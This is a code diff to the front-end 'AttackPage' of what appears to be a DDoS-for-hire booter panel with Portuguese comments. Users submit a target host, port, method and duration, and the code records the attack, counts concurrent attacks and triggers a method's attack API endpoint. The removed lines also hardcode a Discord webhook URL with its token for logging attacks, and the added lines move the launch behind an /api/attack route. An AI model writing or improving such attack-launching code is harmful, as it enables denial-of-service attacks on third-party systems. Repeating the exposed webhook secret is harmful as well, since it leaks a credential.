@@ -160,78 +160,29 @@ export default function AttackPage() {
 
       setIsLoading(true)
 
-      // Criar registro de ataque no histórico
-      const { data: attackData, error: attackError } = await supabase
-        .from("attack_history")
-        .insert([
-          {
-            user_id: profile.id,
-            method_id: values.method,
-            host: values.host,
-            port: values.port,
-            time: values.time,
-            status: "running",
-          },
-        ])
-        .select()
+      const selectedMethodDetails = methods.find((m) => m.id === values.method)
 
-      if (attackError) throw attackError
-
-      // Atualizar contagem de ataques concorrentes
-      const { error: updateError } = await supabase
-        .from("profiles")
-        .update({ concurrent_attacks: updatedProfile.concurrent_attacks + 1 })
-        .eq("id", profile.id)
-
-      if (updateError) throw updateError
-
-      setProfile((prev) => {
-        if (!prev) return null
-        return {
-          ...prev,
-          concurrent_attacks: prev.concurrent_attacks + 1,
-        }
-      })
-
-      // Enviar log do ataque via Discord webhook
-      const discordWebhookUrl = "https://discord.com/api/webhooks/1362629222329483525/FAczRfDpwnU8e6snnfX_yAsEP81McWzxrUoYfC7Gv093FKSdwIAqgeNOc4VJRHyrqIHm"
-      if (!discordWebhookUrl) {
-        console.error("Discord webhook URL is not configured.")
-        return
-      }
-
-      const selectedMethodDetails = methods.find((m) => m.id === values.method) // Renamed variable
-
-      await fetch(discordWebhookUrl, {
+      // Enviar dados para a API route
+      const response = await fetch("/api/attack", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          embeds: [
-            {
-              title: "Attack Log",
-              color: 16711680, // Vermelho
-              fields: [
-                { name: "Username", value: profile.username, inline: true },
-                { name: "IP", value: values.host, inline: true },
-                { name: "Method", value: selectedMethodDetails?.name || "Unknown", inline: true }, // Updated variable
-                { name: "Port", value: values.port.toString(), inline: true },
-                { name: "Time", value: `${values.time} seconds`, inline: true },
-              ],
-              timestamp: new Date().toISOString(),
-            },
-          ],
+          profileId: profile.id,
+          methodId: values.method,
+          host: values.host,
+          port: values.port,
+          time: values.time,
+          username: profile.username,
+          methodName: selectedMethodDetails?.name,
+          apiEndpoint: selectedMethodDetails?.api_endpoint,
         }),
       })
 
-      // Simular chamada à API de ataque
-      const apiEndpoint = selectedMethodDetails.api_endpoint
-        .replace("{HOST}", values.host)
-        .replace("{PORT}", values.port.toString())
-        .replace("{TIME}", values.time.toString())
+      const result = await response.json()
 
-      await fetch(apiEndpoint, { method: "GET" })
+      if (!response.ok) {
+        throw new Error(result.error || "Failed to start attack.")
+      }
 
       // Expirar ataque após o tempo definido
       setTimeout(async () => {
